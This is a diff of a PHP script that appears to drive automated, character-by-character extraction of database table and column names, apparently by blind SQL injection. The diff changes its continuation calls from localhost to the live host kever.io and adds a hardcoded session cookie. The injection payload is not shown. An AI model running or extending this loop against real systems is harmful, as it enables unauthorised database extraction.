@@ -46,7 +46,7 @@ if (count($stateCodeQuery) < 2) {
         }
         //*/
         if ($stateObjectQuery['f'] == 'L') {
-            $file = './pftb/tableColumns.json';
+            $file = './pftb2/tableColumns.json';
             if (!file_exists($file)) {
                 $file_data = [$stateObjectQuery['tb'] => [$stateObjectQuery['cl'] => $result]];
                 //  $file_data = [$stateObjectQuery['tb'] => ['sd_'.$stateObjectQuery['cl'] => $stateCodeQuery]];
@@ -69,7 +69,7 @@ if (count($stateCodeQuery) < 2) {
                     $progress = base64_encode($result);
                 }
                 $nt = 'p1';
-                httpGet('https://localhost/kever/sql.php', ['result' => $progress]);
+                httpGet('https://kever.io/bcc/sql.php', ['result' => $progress], ['Cookie: visitorId=2MmU0NDJjNzZkN2IxOTAxMzkxZjUz']);
                 //header('location: sql.php?result=' . $progress);
             } else {
                 $stateObjectQuery['cl'] = $stateObjectQuery['cl'] + 1;
@@ -77,11 +77,11 @@ if (count($stateCodeQuery) < 2) {
                 $nt = 'p2';
                 $respPage = 'sql.php?cont=' . $continueObj . '&pr=' . $progress;
 
-                httpGet('https://localhost/kever/sql.php', ['cont' => $continueObj, 'pr' => $progress]);
+                httpGet('https://kever.io/bcc/sql.php', ['cont' => $continueObj, 'pr' => $progress], ['Cookie: visitorId=2MmU0NDJjNzZkN2IxOTAxMzkxZjUz']);
                 // header('location: ' . $respPage);
             }
         } else {
-            $file = './pftb/tableColumnNames.json';
+            $file = './pftb2/tableColumnNames.json';
             if (!file_exists($file)) {
                 $file_data = [$stateObjectQuery['tb'] => [$stateObjectQuery['cl'] => [$charposp => $result]]];
                 //  $file_data = [$stateObjectQuery['tb'] => ['sd_'.$stateObjectQuery['cl'] => $stateCodeQuery]];
@@ -104,14 +104,14 @@ if (count($stateCodeQuery) < 2) {
                     $progress = base64_encode($result);
                 }
                 $nt = 'p1';
-                httpGet('https://localhost/kever/sql.php', ['result' => $progress]);
+                httpGet('https://kever.io/bcc/sql.php', ['result' => $progress], ['Cookie: visitorId=2MmU0NDJjNzZkN2IxOTAxMzkxZjUz']);
                 //header('location: sql.php?result=' . $progress);
             } else {
                 $stateObjectQuery['charpos'] = $stateObjectQuery['charpos'] + 1;
                 $continueObj = base64_encode(json_encode($stateObjectQuery));
                 $nt = 'p2';
                 $respPage = 'sql.php?cont=' . $continueObj . '&pr=' . $progress;
-                httpGet('https://localhost/kever/sql.php', ['cont' => $continueObj, 'pr' => $progress]);
+                httpGet('https://kever.io/bcc/sql.php', ['cont' => $continueObj, 'pr' => $progress], ['Cookie: visitorId=2MmU0NDJjNzZkN2IxOTAxMzkxZjUz']);
                 // header('location: ' . $respPage);
             }
         }
@@ -137,7 +137,7 @@ echo date('H:i:s');
 //session_unset();
 //session_reset();
 //unset($_SESSION[$processQuery['tb'].'_'.$processQuery['cl']]);
-//https://localhost/kever/sql.php
+//https://kever.io/bcc/sql.php
 
 function sql_verif($statecode, $stateobject)
 {
@@ -186,7 +186,7 @@ function sql_verif($statecode, $stateobject)
             }
             //*/
             if ($stateObjectQuery['f'] == 'L') {
-                $file = './pftb/tableColumns.json';
+                $file = './pftb2/tableColumns.json';
                 if (!file_exists($file)) {
                     $file_data = [$stateObjectQuery['tb'] => [$stateObjectQuery['cl'] => $result]];
                     //  $file_data = [$stateObjectQuery['tb'] => ['sd_'.$stateObjectQuery['cl'] => $stateCodeQuery]];
@@ -209,7 +209,7 @@ function sql_verif($statecode, $stateobject)
                         $progress = base64_encode($result);
                     }
                     $nt = 'p1';
-                    httpGet('https://localhost/kever/sql.php', ['result' => $progress]);
+                    httpGet('https://kever.io/bcc/sql.php', ['result' => $progress], ['Cookie: visitorId=2MmU0NDJjNzZkN2IxOTAxMzkxZjUz']);
                     //header('location: sql.php?result=' . $progress);
                 } else {
                     $stateObjectQuery['cl'] = $stateObjectQuery['cl'] + 1;
@@ -217,11 +217,11 @@ function sql_verif($statecode, $stateobject)
                     $nt = 'p2';
                     $respPage = 'sql.php?cont=' . $continueObj . '&pr=' . $progress;
 
-                    httpGet('https://localhost/kever/sql.php', ['cont' => $continueObj, 'pr' => $progress]);
+                    httpGet('https://kever.io/bcc/sql.php', ['cont' => $continueObj, 'pr' => $progress], ['Cookie: visitorId=2MmU0NDJjNzZkN2IxOTAxMzkxZjUz']);
                     // header('location: ' . $respPage);
                 }
             } else {
-                $file = './pftb/tableColumnNames.json';
+                $file = './pftb2/tableColumnNames.json';
                 if (!file_exists($file)) {
                     $file_data = [$stateObjectQuery['tb'] => [$stateObjectQuery['cl'] => [$charposp => $result]]];
                     //  $file_data = [$stateObjectQuery['tb'] => ['sd_'.$stateObjectQuery['cl'] => $stateCodeQuery]];
@@ -244,14 +244,14 @@ function sql_verif($statecode, $stateobject)
                         $progress = base64_encode($result);
                     }
                     $nt = 'p1';
-                    httpGet('https://localhost/kever/sql.php', ['result' => $progress]);
+                    httpGet('https://kever.io/bcc/sql.php', ['result' => $progress], ['Cookie: visitorId=2MmU0NDJjNzZkN2IxOTAxMzkxZjUz']);
                     //header('location: sql.php?result=' . $progress);
                 } else {
                     $stateObjectQuery['charpos'] = $stateObjectQuery['charpos'] + 1;
                     $continueObj = base64_encode(json_encode($stateObjectQuery));
                     $nt = 'p2';
                     $respPage = 'sql.php?cont=' . $continueObj . '&pr=' . $progress;
-                    httpGet('https://localhost/kever/sql.php', ['cont' => $continueObj, 'pr' => $progress]);
+                    httpGet('https://kever.io/bcc/sql.php', ['cont' => $continueObj, 'pr' => $progress], ['Cookie: visitorId=2MmU0NDJjNzZkN2IxOTAxMzkxZjUz']);
                     // header('location: ' . $respPage);
                 }
             }
